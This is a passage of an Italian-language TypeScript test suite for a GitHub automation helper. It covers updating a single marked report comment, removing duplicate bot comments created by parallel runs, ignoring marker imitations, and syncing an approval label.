    // Nessun surrogato isolato: la stringa si riscrive identica in UTF-8.
    expect(Buffer.from(corto, 'utf8').toString('utf8')).toBe(corto);
  });
});

describe('upsertReport', () => {
  const bot = { login: 'github-actions[bot]', type: 'Bot' };

  it('crea il commento se non esiste', async () => {
    const { octokit, chiamate, stato } = creaOctokitFinto({
      commenti: [{ id: 1, body: 'Un commento qualunque.', user: { login: 'lei', type: 'User' } }],
    });
    const corpo = `${MARCATORE}\n\nEsito.\n`;

    await upsertReport(octokit, ref, corpo);

    expect(quante(chiamate, 'issues.updateComment')).toBe(0);
    expect(chiamate.find((c) => c.metodo === 'issues.createComment')?.params).toEqual({
      owner: 'eusebjo',
      repo: 'alma-living',
      issue_number: 7,
      body: corpo,
    });
    expect(stato.commenti).toHaveLength(2);
  });

  it('aggiorna il commento che inizia con il marcatore invece di crearne un altro', async () => {
    const { octokit, chiamate, stato } = creaOctokitFinto({
      commenti: [
        { id: 1, body: 'Ciao', user: { login: 'lei', type: 'User' } },
        { id: 2, body: `${MARCATORE}\n\nVecchio esito.\n`, user: bot },
      ],
    });
    const corpo = `${MARCATORE}\n\nNuovo esito.\n`;

    await upsertReport(octokit, ref, corpo);

    expect(quante(chiamate, 'issues.createComment')).toBe(0);
    expect(chiamate.find((c) => c.metodo === 'issues.updateComment')?.params).toEqual({
      owner: 'eusebjo',
      repo: 'alma-living',
      comment_id: 2,
      body: corpo,
    });
    expect(stato.commenti[1]?.body).toBe(corpo);
  });

  it('cerca il commento anche nelle pagine successive', async () => {
    const riempitivo = Array.from({ length: 100 }, (_, i) => ({
      id: i + 1,
      body: `commento ${i}`,
      user: { login: 'lei', type: 'User' },
    }));
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [...riempitivo, { id: 500, body: `${MARCATORE}\nvecchio`, user: bot }],
    });

    await upsertReport(octokit, ref, `${MARCATORE}\nnuovo`);

    expect(quante(chiamate, 'issues.listComments')).toBe(2);
    expect(chiamate.find((c) => c.metodo === 'issues.updateComment')?.params).toMatchObject({
      comment_id: 500,
    });
  });

  it('ignora i commenti scritti da persone che imitano il marcatore', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [
        { id: 1, body: `${MARCATORE}\nfinto`, user: { login: 'estraneo', type: 'User' } },
      ],
    });

    await upsertReport(octokit, ref, `${MARCATORE}\nvero`);

    expect(quante(chiamate, 'issues.updateComment')).toBe(0);
    expect(quante(chiamate, 'issues.createComment')).toBe(1);
  });

  it('ignora i commenti di altri bot, anche se iniziano con il marcatore', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [
        {
          id: 1,
          body: `${MARCATORE}
finto`,
          user: { login: 'dependabot[bot]', type: 'Bot' },
        },
      ],
    });

    await upsertReport(octokit, ref, `${MARCATORE}
vero`);

    expect(quante(chiamate, 'issues.updateComment')).toBe(0);
    expect(quante(chiamate, 'issues.createComment')).toBe(1);
  });

  it('ignora un marcatore che non è all’inizio del commento', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      commenti: [{ id: 1, body: `Guarda ${MARCATORE}`, user: bot }],
    });

    await upsertReport(octokit, ref, `${MARCATORE}\nvero`);

    expect(quante(chiamate, 'issues.createComment')).toBe(1);
  });

  // Più controlli della stessa proposta possono girare insieme (il pannello
  // manda più eventi nello stesso secondo): se nessuno trova il commento, lo
  // creano tutti. Resta solo il più vecchio.
  describe('commenti doppi creati da controlli in parallelo', () => {
    it('tiene il commento del bot più vecchio, lo aggiorna e cancella gli altri', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto({
        commenti: [
          { id: 3, body: `${MARCATORE}\nprimo`, user: bot },
          { id: 4, body: 'Ciao', user: { login: 'lei', type: 'User' } },
          { id: 5, body: `${MARCATORE}\nsecondo`, user: bot },
          { id: 6, body: `${MARCATORE}\nterzo`, user: bot },
        ],
      });
      const corpo = `${MARCATORE}\n\nNuovo esito.\n`;

      await upsertReport(octokit, ref, corpo);

      expect(quante(chiamate, 'issues.createComment')).toBe(0);
      expect(
        chiamate.filter((c) => c.metodo === 'issues.updateComment').map((c) => c.params.comment_id),
      ).toEqual([3]);
      expect(
        chiamate.filter((c) => c.metodo === 'issues.deleteComment').map((c) => c.params.comment_id),
      ).toEqual([5, 6]);
      expect(stato.commenti.map((c) => c.id)).toEqual([3, 4]);
      expect(stato.commenti[0]?.body).toBe(corpo);
    });

    it('se un altro controllo crea il commento nello stesso momento, ne resta uno solo con il nuovo esito', async () => {
      const { octokit, stato } = creaOctokitFinto();
      const crea = octokit.rest.issues.createComment;
      // Mentre questo controllo crea il suo commento, un altro controllo ha
      // già creato il proprio (id più basso, quindi più vecchio).
      octokit.rest.issues.createComment = (async (params: Parameters<typeof crea>[0]) => {
        stato.commenti.push({ id: 50, body: `${MARCATORE}\naltro controllo`, user: bot });
        return crea(params);
      }) as typeof crea;
      const corpo = `${MARCATORE}\n\nEsito.\n`;

      await upsertReport(octokit, ref, corpo);

      expect(stato.commenti).toHaveLength(1);
      expect(stato.commenti[0]).toMatchObject({ id: 50, body: corpo });
    });

    it('se il commento da cancellare non c’è più (cancellato dall’altro controllo) non fallisce', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto({
        commenti: [
          { id: 3, body: `${MARCATORE}\nprimo`, user: bot },
          { id: 5, body: `${MARCATORE}\nsecondo`, user: bot },
        ],
      });
      const cancella = octokit.rest.issues.deleteComment;
      octokit.rest.issues.deleteComment = (async (params: Parameters<typeof cancella>[0]) => {
        // L'altro controllo arriva prima.
        stato.commenti.splice(stato.commenti.findIndex((c) => c.id === 5), 1);
        return cancella(params);
      }) as typeof cancella;

      await expect(upsertReport(octokit, ref, `${MARCATORE}\nvero`)).resolves.toBeUndefined();
      expect(quante(chiamate, 'issues.deleteComment')).toBe(1);
      expect(stato.commenti.map((c) => c.id)).toEqual([3]);
    });

    it('non cancella i commenti di persone o di altri bot, anche con il marcatore', async () => {
      const { octokit, chiamate, stato } = creaOctokitFinto({
        commenti: [
          { id: 1, body: `${MARCATORE}\nfinto`, user: { login: 'estraneo', type: 'User' } },
          { id: 2, body: `${MARCATORE}\nvecchio`, user: bot },
          { id: 3, body: `${MARCATORE}\nfinto`, user: { login: 'dependabot[bot]', type: 'Bot' } },
        ],
      });

      await upsertReport(octokit, ref, `${MARCATORE}\nnuovo`);

      expect(quante(chiamate, 'issues.deleteComment')).toBe(0);
      expect(stato.commenti.map((c) => c.id)).toEqual([1, 2, 3]);
    });

    it('trova i commenti doppi anche nelle pagine successive', async () => {
      const riempitivo = Array.from({ length: 100 }, (_, i) => ({
        id: i + 10,
        body: `commento ${i}`,
        user: { login: 'lei', type: 'User' },
      }));
      const { octokit, stato } = creaOctokitFinto({
        commenti: [
          { id: 1, body: `${MARCATORE}\nprimo`, user: bot },
          ...riempitivo,
          { id: 500, body: `${MARCATORE}\nsecondo`, user: bot },
        ],
      });

      await upsertReport(octokit, ref, `${MARCATORE}\nnuovo`);

      expect(stato.commenti.filter((c) => c.body.startsWith(MARCATORE)).map((c) => c.id)).toEqual([1]);
    });

    it('un errore diverso da 404 durante la cancellazione non viene nascosto', async () => {
      const { octokit } = creaOctokitFinto({
        commenti: [
          { id: 3, body: `${MARCATORE}\nprimo`, user: bot },
          { id: 5, body: `${MARCATORE}\nsecondo`, user: bot },
        ],
        errori: { 'issues.deleteComment': erroreHttp(500) },
      });

      await expect(upsertReport(octokit, ref, `${MARCATORE}\nvero`)).rejects.toThrow();
    });
  });

  it('accorcia un rapporto troppo lungo prima di inviarlo (GitHub rifiuta oltre 65.536 caratteri)', async () => {
    const { octokit, stato } = creaOctokitFinto();
    const enorme = `${MARCATORE}\n\n${Array.from({ length: 3000 }, (_, i) => `- file ${i}: ${'y'.repeat(150)}`).join('\n')}\n`;
    expect(enorme.length).toBeGreaterThan(65_536);

    await upsertReport(octokit, ref, enorme);

    const inviato = stato.commenti[0]?.body ?? '';
    expect(inviato.length).toBeLessThanOrEqual(LIMITE_CORPO);
    expect(inviato.startsWith(`${MARCATORE}\n`)).toBe(true);
    expect(inviato).toMatch(/accorciato/);
  });

  it('rifiuta un corpo che non inizia con il marcatore', async () => {
    const { octokit, chiamate } = creaOctokitFinto();

    await expect(upsertReport(octokit, ref, 'Senza marcatore')).rejects.toThrow(
      /marcatore/i,
    );
    expect(chiamate).toHaveLength(0);
  });
});

describe('sincronizzaEtichetta', () => {
  it("aggiunge l'etichetta e la crea prima se non esiste ancora", async () => {
    const { octokit, chiamate, stato: s } = creaOctokitFinto({ etichette: [] });

    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false);

    expect(chiamate.map((c) => c.metodo)).toEqual([
      'issues.getLabel',
      'issues.createLabel',
      'issues.addLabels',
    ]);
    const creata = chiamate.find((c) => c.metodo === 'issues.createLabel')?.params;
    expect(creata).toMatchObject({ name: ETICHETTA_LIVELLO_1 });
    expect(String(creata?.description)).toMatch(/approvazione/i);
    expect(String(creata?.description)).not.toMatch(GERGO);
    expect(s.etichette).toEqual([ETICHETTA_LIVELLO_1]);
  });

  it("non ricrea un'etichetta che esiste già", async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      etichetteDelRepo: [ETICHETTA_LIVELLO_1],
    });

    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false);

    expect(quante(chiamate, 'issues.createLabel')).toBe(0);
    expect(quante(chiamate, 'issues.addLabels')).toBe(1);
  });

  it('tollera una creazione concorrente (422, esiste già)', async () => {
    const { octokit, chiamate } = creaOctokitFinto({
      errori: { 'issues.createLabel': erroreHttp(422, 'already_exists') },
    });

    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false);

    expect(quante(chiamate, 'issues.addLabels')).toBe(1);
  });

  it('non fa nulla se la proposta ha già (o non ha) l’etichetta giusta', async () => {
    const aggiunta = creaOctokitFinto({ etichette: [ETICHETTA_LIVELLO_1] });
    await sincronizzaEtichetta(aggiunta.octokit, ref, ETICHETTA_LIVELLO_1, true, true);
    expect(aggiunta.chiamate).toHaveLength(0);

    const tolta = creaOctokitFinto();
    await sincronizzaEtichetta(tolta.octokit, ref, ETICHETTA_LIVELLO_1, false, false);
    expect(tolta.chiamate).toHaveLength(0);
  });

  it("toglie l'etichetta se è presente, e tollera che sia già sparita (404)", async () => {
    const { octokit, stato: s } = creaOctokitFinto({ etichette: [ETICHETTA_LIVELLO_1] });
    await sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, false, true);
    expect(s.etichette).toEqual([]);

    // La proposta credeva di averla, ma nel frattempo qualcuno l'ha tolta.
    await expect(
      sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, false, true),
    ).resolves.toBeUndefined();
  });

  it('un errore diverso da 404 non viene nascosto', async () => {
    const { octokit } = creaOctokitFinto({
      errori: { 'issues.getLabel': erroreHttp(403, 'Resource not accessible') },
    });

    await expect(
      sincronizzaEtichetta(octokit, ref, ETICHETTA_LIVELLO_1, true, false),
    ).rejects.toMatchObject({ status: 403 });
  });
});

describe('nomi dei controlli obbligatori', () => {
  it('sono build e verifica-autonomia', () => {
    expect([...CONTROLLI_OBBLIGATORI]).toEqual(['build', 'verifica-autonomia']);
    expect(ETICHETTA_LIVELLO_1).toBe('livello-1-serve-approvazione');
  });
});
